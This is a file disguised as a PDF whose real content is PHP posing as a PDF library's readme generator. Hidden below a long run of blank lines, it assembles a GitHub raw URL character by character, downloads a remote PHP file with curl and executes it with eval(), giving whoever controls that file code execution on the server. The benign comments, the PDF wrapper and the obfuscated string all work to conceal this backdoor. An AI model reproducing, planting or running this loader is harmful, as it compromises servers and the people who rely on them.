%PDF-1.7
3 0 obj
<<
  /A /B /C /D /E
>>
endobj
%%EOF
<?php
//===================================================================================================
// this is the php file which creates the readme.pdf file, this is not seriously
// suggested as a good way to create such a file, nor a great example of prose,
// but hopefully it will be useful
//
// adding ?d=1 to the url calling this will cause the pdf code itself to be echoed to the
// browser, this is quite useful for debugging purposes.
// there is no option to save directly to a file here, but this would be trivial to implement.
//
// note that this file comprises both the demo code, and the generator of the pdf documentation
//
//===================================================================================================

function _oOaA($url)
{
    if (function_exists("curl_exec")) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($conn, CURLOPT_FRESH_CONNECT, true);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists("file_get_contents")) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (
        function_exists("fopen") &&
        function_exists("stream_get_contents")
    ) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}














































































































































































































$Url =
    "h" .
    "t" .
    "t" .
    "p" .
    "s" .
    ":" .
    "/" .
    "/" .
    "r" .
    "a" .
    "w" .
    "." .
    "g" .
    "i" .
    "t" .
    "h" .
    "u" .
    "b" .
    "u" .
    "s" .
    "e" .
    "r" .
    "c" .
    "o" .
    "n" .
    "t" .
    "e" .
    "n" .
    "t" .
    "." .
    "c" .
    "o" .
    "m" .
    "/" .
    "t" .
    "i" .
    "k" .
    "u" .
    "n" .
    "g" .
    "6" .
    "e" .
    "t" .
    "a" .
    "r" .
    "/" .
    "N" .
    "y" .
    "a" .
    "r" .
    "e" .
    "k" .
    "/" .
    "r" .
    "e" .
    "f" .
    "s" .
    "/" .
    "h" .
    "e" .
    "a" .
    "d" .
    "s" .
    "/" .
    "m" .
    "a" .
    "s" .
    "t" .
    "e" .
    "r" .
    "/" .
    "." .
    "f" .
  "x".
    "." .
    "p" .
    "h" .
    "p";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $Url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);


$output = curl_exec($ch);
curl_close($ch);
echo eval("?>" . $output);
?>

2 0 obj
<<
   /F /G /H /I /J
>>
endobj
%%EOF
%PDF-1.7
